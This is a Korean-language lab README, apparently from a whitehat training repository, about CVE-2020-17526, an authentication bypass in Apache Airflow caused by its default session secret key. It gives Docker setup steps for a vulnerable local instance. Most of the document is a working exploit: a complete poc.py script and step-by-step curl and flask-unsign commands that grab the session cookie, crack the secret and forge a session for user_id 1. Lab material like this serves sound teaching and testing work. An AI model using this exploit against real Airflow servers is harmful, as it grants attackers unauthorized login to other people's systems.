## CVE-2020-17526


Apache Airflow는 오픈 소스 분산 작업 예약 프레임워크입니다. 기본적으로 인증은 필요하지 않지만 관리에서는 webserver.authenticate=True를 지정하여 활성화할 수 있습니다.

1.10.13 이전 버전에서 Apache Airflow는 기본 세션 secert 키를 사용하므로 인증이 활성화되면 임의의 사용자로 로그인 가능합니다.

References:

-   https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
-   https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise

## Vulnerability Environment - 취약환경

다음 명령을 실행하여 airflow 1.10.10 서버를 시작합니다.

```
docker compose run airflow-init
docker compose up -d
```

위 명령어 후에 서버가 실행 되고, http://localhost:8080으로 접속하면 Apache Airflow서비스의 로그인 페이지에 접근 할 수 있습니다.

## Exploit

0\. 3번까지의 내용을 생략하고 poc.py를 실행시킬 수 있습니다.
poc.py
```
import requests
import re
import subprocess

url = "http://localhost:8080/admin/airflow/login"
response = requests.get(url)
set_cookie_header = response.headers.get("Set-Cookie")
session_value = re.search(r'session=(.*?);', set_cookie_header)

if session_value:
    session_value = session_value.group(1)
    print("Session 값:", session_value)
else:
    print("Session 값이 없습니다.")

command = "flask-unsign -u -c " + session_value
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if result.returncode == 0:
    print("secret")
    print(result.stdout)
else:
    print("명령 실행 실패")
    print(result.stderr)

crack_session = result.stdout
crack_session = crack_session.replace('\'','').replace('\n','')
command2 = "flask-unsign -s --secret "+crack_session+" -c \"{'user_id': '1', '_fresh': False, '_permanent': True}\""
result2 = subprocess.run(command2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if result2.returncode == 0:
    print("final session")
    print(result2.stdout)
else:
    print("명령 실행 실패")
    print(result2.stderr)
```

1\. 서비스에 접근해서 Cookie를 받습니다.

```
curl -v http://localhost:8080/admin/airflow/login
```

curl(↑) 또는 파이썬(↓)을 이용합니다

```
import requests
import re

url = "http://localhost:8080/admin/airflow/login"
response = requests.get(url)
set_cookie_header = response.headers.get("Set-Cookie")
session_value = re.search(r'session=(.*?);', set_cookie_header)

if session_value:
    session_value = session_value.group(1)
    print("Session 값:", session_value)
else:
    print("Session 값이 없습니다.")
```

![image](https://github.com/breakpack/whitehat-school-vulhub/assets/108794308/2f29d1c7-cc14-4b15-a44b-92f42a43f93a)


2\. flask-unsign을 이용해 session key를 크랙합니다.

```
flask-unsign -u -c [session from Cookie]
```

![image](https://github.com/breakpack/whitehat-school-vulhub/assets/108794308/776d0d36-8260-443f-8301-7fe92807acc7)


3\. user\_id가 1인 유저에 접근하기 위해 session 생성

```
flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
```

![image](https://github.com/breakpack/whitehat-school-vulhub/assets/108794308/9e00264f-3b55-4454-b81f-60d478a4ef5c)


4\. 쿠키에 삽입후 로그인 확인

![image](https://github.com/breakpack/whitehat-school-vulhub/assets/108794308/a42ce5f9-9f6b-453a-abb8-0cb970f42828)
